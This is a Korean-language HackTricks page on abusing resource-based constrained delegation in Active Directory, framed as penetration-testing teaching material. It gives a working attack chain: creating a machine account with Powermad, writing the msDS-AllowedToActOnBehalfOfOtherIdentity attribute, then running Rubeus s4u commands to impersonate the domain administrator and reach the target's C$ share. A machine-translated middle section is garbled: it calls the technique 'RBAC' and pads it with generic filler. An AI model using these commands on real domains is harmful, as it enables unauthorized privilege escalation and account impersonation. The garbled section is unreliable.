# 리소스 기반 제한된 위임

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 리소스 기반 제한된 위임의 기본 사항

이것은 기본적인 [제한된 위임](constrained-delegation.md)과 유사하지만, **객체에 권한을 부여하여 서비스에 대해 어떤 사용자든 가장할 수 있도록 하는 대신** 리소스 기반 제한된 위임은 **객체에 대해 어떤 사용자든 가장할 수 있는 사용자의 이름을 설정**합니다.

이 경우, 제한된 객체에는 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_라는 속성이 있으며, 이를 통해 다른 사용자를 대신하여 가장할 수 있는 사용자의 이름을 설정할 수 있습니다.

이 제한된 위임과 다른 위임들 사이의 또 다른 중요한 차이점은 **기계 계정에 대한 쓰기 권한**(_GenericAll/GenericWrite/WriteDacl/WriteProperty 등_)을 가진 **모든 사용자**가 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_를 설정할 수 있다는 것입니다(다른 형태의 위임에서는 도메인 관리자 권한이 필요합니다).

### 새로운 개념

제한된 위임에서는 사용자의 _userAccountControl_ 값 내의 **`TrustedToAuthForDelegation`** 플래그가 **S4U2Self**를 수행하기 위해 필요하다고 언급되었습니다. 그러나 이는 완전한 사실이 아닙니다.\
실제로는 그 값을 가지지 않아도 **서비스**(SPN을 가진)인 경우에는 어떤 사용자에 대해 **S4U2Self**를 수행할 수 있지만, **`TrustedToAuthForDelegation`**을 가지고 있다면 반환된 TGS는 **Forwardable**하게 되고, 그 플래그를 가지고 있지 않으면 반환된 TGS는 **Forwardable**하지 않게 됩니다.

그러나 **TGS**가 **Forwardable**하지 않은 경우 **기본 제한된 위임**을 악용하려고 하면 **작동하지 않습니다**. 그러나 **리소스 기반 제한된 위임을 악용**하려고 하면 작동합니다(이는 취약점이 아닌 기능으로 보입니다).

### 공격 구조

> **컴퓨터** 계정에 **쓰기 등가 권한**이 있다면 해당 컴퓨터에서 **특권 액세스**를 얻을 수 있습니다.

공격자가 이미 피해 컴퓨터에 대한 **쓰기 등가 권한**을 가지고 있다고 가정합니다.

1. 공격자는 **SPN**을 가진 계정을 **침해**하거나 하나를 생성합니다("Service A"). 다른 특별한 권한이 없는 **임의의 관리자 사용자**는 최대 10개의 **컴퓨터 개체(MachineAccountQuota)**를 생성하고 SPN을 설정할 수 있습니다. 따라서 공격자는 컴퓨터 개체를 생성하고 SPN을 설정할 수 있습니다.
2. 공격자는 피해 컴퓨터(ServiceB)에 대한 **쓰기 권한**을 악용하여 **리소스 기반 제한된 위임을 구성**하여 ServiceA가 해당 피해 컴퓨터(ServiceB)에 대해 **어떤 사용자든 가장할 수 있도록**합니다.
3. 공격자는 Rubeus를 사용하여 Service A에서 Service B로 **전체 S4U 공격**(S4U2Self 및 S4U2Proxy)을 수행합니다. 이를 위해 Service B에 특권 액세스를 가진 사용자를 대상으로 합니다.
1. S4U2Self(침해/생성된 계정의 SPN): **관리자에 대한 TGS를 나에게 요청**(Forwardable하지 않음).
2. S4U2Proxy: 이전 단계의 **Forwardable하지 않은 TGS**를 사용하여 **관리자에서 피해 호스트로 TGS**를 요청합니다.
3. Forwardable하지 않은 TGS를 사용하더라도 리소스 기반 제한된 위임을 악용하고 있기 때문에 작동합니다.
4. 공격자는 **티켓 전달**을 수행하고 사용자를 **가장**하여 피해 ServiceB에 **액세스**를 얻을 수 있습니다.

도메인의 _**MachineAccountQuota**_를 확인하려면 다음을 사용할 수 있습니다:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 공격

### 컴퓨터 개체 생성

도메인 내에서 [powermad](https://github.com/Kevin-Robertson/Powermad)를 사용하여 컴퓨터 개체를 생성할 수 있습니다.
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### R**esource-based Constrained Delegation 구성**

**activedirectory PowerShell 모듈 사용하기**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview 사용하기**

Powerview는 Windows 환경에서 Active Directory를 탐색하고 조작하는 데 사용되는 강력한 도구입니다. Powerview를 사용하면 다양한 기능을 활용하여 Active Directory의 리소스 기반 제한된 위임(RBAC)을 조작할 수 있습니다.

**Resource-Based Constrained Delegation (RBAC)**

리소스 기반 제한된 위임(RBAC)은 Active Directory에서 사용되는 중요한 보안 기능 중 하나입니다. 이 기능을 통해 사용자는 특정 리소스에 대한 권한을 다른 사용자에게 위임할 수 있습니다. 이를 통해 사용자는 다른 사용자가 특정 리소스에 대한 액세스 권한을 가지도록 설정할 수 있습니다.

**RBAC의 취약점**

RBAC는 잘 구성되어 있으면 안전한 기능이지만, 잘못 구성된 경우 공격자에게 취약점을 제공할 수 있습니다. 공격자는 잘못된 RBAC 구성을 이용하여 특정 리소스에 대한 권한을 탈취하거나 다른 사용자의 권한을 도용할 수 있습니다.

**Powerview를 사용한 RBAC 공격**

Powerview를 사용하여 RBAC 공격을 수행할 수 있습니다. Powerview는 다양한 명령어와 함수를 제공하여 RBAC 설정을 탐색하고 조작할 수 있습니다. 이를 통해 공격자는 잘못된 RBAC 구성을 찾아내고 악용할 수 있습니다.

**RBAC 공격의 예**

다음은 Powerview를 사용하여 RBAC 공격을 수행하는 예입니다.

1. `Get-DomainUser` 명령어를 사용하여 도메인 사용자 목록을 가져옵니다.
2. `Get-DomainGroup` 명령어를 사용하여 도메인 그룹 목록을 가져옵니다.
3. `Get-DomainGroupMember` 명령어를 사용하여 특정 그룹의 구성원을 가져옵니다.
4. `Get-DomainObjectAcl` 명령어를 사용하여 특정 리소스의 ACL(Access Control List)을 가져옵니다.
5. `Set-DomainObjectAcl` 명령어를 사용하여 특정 리소스의 ACL을 수정합니다.

**RBAC 공격 방지하기**

RBAC 공격을 방지하기 위해 다음과 같은 조치를 취할 수 있습니다.

1. 정기적인 보안 감사를 수행하여 RBAC 구성을 검토합니다.
2. 최소 권한 원칙을 준수하여 필요한 권한만 부여합니다.
3. 제한된 위임 설정을 검토하고 필요한 경우 수정합니다.
4. 보안 패치를 정기적으로 적용하여 시스템을 최신 상태로 유지합니다.

**참고 자료**

- [Powerview GitHub 저장소](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
- [Active Directory Resource-Based Constrained Delegation](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/active-directory-resource-based-constrained-delegation)
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 완전한 S4U 공격 수행

먼저, 우리는 비밀번호 `123456`으로 새로운 컴퓨터 객체를 생성했습니다. 따라서 해당 비밀번호의 해시가 필요합니다:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
이것은 해당 계정의 RC4 및 AES 해시를 출력합니다.
이제, 공격을 수행할 수 있습니다:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus의 `/altservice` 매개변수를 사용하여 한 번만 요청하여 더 많은 티켓을 생성할 수 있습니다:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
사용자에는 "**위임할 수 없음**"이라는 속성이 있습니다. 사용자가 이 속성을 True로 설정하면 그를 위장할 수 없습니다. 이 속성은 bloodhound에서 확인할 수 있습니다.
{% endhint %}

### 접근

마지막 명령줄은 **완전한 S4U 공격을 수행하고 TGS를 피해자 호스트의 메모리에 주입**합니다.\
이 예제에서는 Administrator의 **CIFS** 서비스에 대한 TGS가 요청되었으므로 **C$**에 액세스할 수 있습니다.
```bash
ls \\victim.domain.local\C$
```
### 다양한 서비스 티켓 남용

[**여기에서 사용 가능한 서비스 티켓을 확인하세요**](silver-ticket.md#available-services).

## Kerberos 오류

* **`KDC_ERR_ETYPE_NOTSUPP`**: 이는 Kerberos가 DES 또는 RC4을 사용하지 않도록 구성되어 있으며, 단지 RC4 해시만 제공하고 있는 경우를 의미합니다. Rubeus에 최소한 AES256 해시를 제공하거나 rc4, aes128 및 aes256 해시를 제공하세요. 예시: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: 현재 컴퓨터의 시간이 DC의 시간과 다르며, Kerberos가 제대로 작동하지 않는 것을 의미합니다.
* **`preauth_failed`**: 주어진 사용자 이름 + 해시가 로그인에 작동하지 않는 것을 의미합니다. 해시를 생성할 때 사용자 이름에 "$"를 넣는 것을 잊었을 수 있습니다 (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: 다음을 의미할 수 있습니다:
  * 특정 서비스에 대한 티켓을 요청하는 사용자가 해당 서비스에 액세스할 수 없음 (사용자를 표현할 수 없거나 권한이 충분하지 않은 경우)
  * 요청한 서비스가 존재하지 않음 (예를 들어 winrm 티켓을 요청했지만 winrm이 실행되고 있지 않은 경우)
  * 생성된 가짜 컴퓨터가 취약한 서버에 대한 권한을 잃어버렸으며, 다시 권한을 부여해야 함

## 참고 자료

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹을 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **자신의 해킹 기법을 공유**하세요.

</details>
